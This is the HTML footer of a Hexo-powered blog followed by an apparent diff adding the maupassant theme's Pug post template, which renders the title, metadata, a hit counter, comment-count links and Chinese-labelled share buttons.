href="/." rel="nofollow">K0rz3n's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>
+extends base
+
+block title
+  title= page.title + ' | ' + config.title
+
+block content
+  .post
+    h1.post-title= page.title
+    .post-meta= page.date.format('ll')
+      if page.categories.length > 0
+        span= ' | '
+        span.category
+          for category in page.categories.toArray()
+            a(href=url_for(category.path))= category.name
+      if theme.busuanzi == true
+        script(src='https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js', async)
+        span#busuanzi_container_page_pv= ' | '
+          span#busuanzi_value_page_pv
+          span= ' ' + __('Hits')
+    if theme.duoshuo
+      a.ds-thread-count(data-thread-key=page.path, href=url_for(page.path) + '#comments')
+    if theme.disqus
+      a.disqus-comment-count(data-disqus-identifier=page.path, href=url_for(page.path) + '#disqus_thread')
+    if theme.gentie
+      a.ds-thread-count(class='cloud-tie-join-count', href=url_for(page.path) + '#comments')
+        span.join-count(style='font-size: 15px; color: #6E7173;') 0
+        span= ' ' + __('Discuss')
+
+    .post-content
+      != page.content
+    if theme.shareto == true
+      script(type='text/javascript', src=url_for(theme.js) + '/share.js' + '?v=' + theme.version, async)
+      a.article-share-link(data-url='#{page.permalink}', data-id='#{page._id}')= __('shareto')
+    include _partial/tag
+    include _partial/post_nav
+    if theme.duoshuo
+      div(class='ds-share flat' data-thread-key=page.path, data-title=page.title, data-url=page.permalink)
+         .ds-share-inline
+            ul.ds-share-icons-16
+              li(data-toggle='ds-share-icons-more')
+                a(class='ds-more' href='javascript:void(0);') 分享到：
+              li
+                a(class='ds-weibo' href='javascript:void(0);' data-service='weibo') 微博
+              li
+                a(class='ds-qzone' href='javascript:void(0);' data-service='qzone') QQ空间
+              li
+                a(class='ds-qqt' href='javascript:void(0);' data-service='qqt') 腾讯微博
+              li
+                a(class='ds-wechat' href='javascript:void(0);' data-service='wechat') 微信
+            .ds-share-icons-more
+    if page.comments
+      include _partial/comments
